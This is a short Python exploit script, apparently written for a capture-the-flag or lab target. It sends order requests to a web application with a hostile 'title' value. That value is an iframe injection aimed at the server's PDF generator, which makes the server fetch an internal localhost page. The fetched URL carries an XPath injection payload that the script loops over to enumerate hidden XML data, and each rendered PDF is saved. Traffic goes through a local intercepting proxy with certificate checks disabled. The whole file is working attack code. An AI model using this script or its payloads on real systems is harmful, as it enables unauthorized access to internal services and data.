import requests
import re

headers = {
    'Host': '94.237.61.216:55759',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.237.61.216:55759',
    'Connection': 'keep-alive',
    'Referer': 'http://94.237.61.216:55759/',
    'Upgrade-Insecure-Requests': '1',
}

data = {
    'id': '3',
    'desc': 'Our custom motherboard.',
    'comment': '',
}

# Proxy configuration
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def create_numlist():
    return list(range(0,10))

def sanitize_filename(filename):
    return re.sub(r'[\\/*?:"<>|]', '_', filename)

def send_request(title):
    data['title'] = """<iframe src="http://127.0.0.1:8000/index.php?q=fullstreetname | /*[1]/*[{}]/*[1]" width="700" height="800"></iframe>""".format(title)
    
    response = requests.post('http://94.237.54.229:31311/order.php', headers=headers, data=data, proxies=proxies, verify=False)

    sanitized_title = sanitize_filename(title)
    
    if response.content and b"Error: Failed to load" not in response.content:
        with open(f'response_{sanitized_title}.pdf', 'wb') as f:
            f.write(response.content)
        print(f'PDF saved for title: {title}')
    else:
        print(f'Response for title: {title} is empty or contains an error message.')

# Read payload.txt and store lines
try:
    numlist= create_numlist()

    # Execute requests for each line
    for title in numlist:
        send_request(str(title))
    print('All requests completed!')
except KeyboardInterrupt:
    print("ctrl + c detected, exiting gracefully")
